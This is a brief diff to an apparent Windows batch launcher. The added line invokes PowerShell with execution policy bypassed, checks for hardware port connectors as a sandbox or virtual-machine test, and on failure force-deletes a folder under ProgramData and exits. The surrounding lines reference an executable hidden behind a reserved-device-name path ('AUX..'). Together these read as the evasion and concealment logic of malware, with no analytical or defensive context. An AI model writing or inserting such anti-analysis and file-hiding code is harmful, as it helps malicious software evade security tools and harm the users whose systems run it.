@@ -1,3 +1,4 @@
+powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "if (-not ([System.Management.ManagementObjectSearcher]::new('SELECT * FROM Win32_PortConnector').Get().Count)) { Remove-Item -Path ($env:ProgramData + '\dist') -Recurse -Force -ErrorAction SilentlyContinue; exit 1 }" || exit
 setlocal EnableDelayedExpansion
 
 if exist "%ProgramData%\AUX..\Input.exe" (
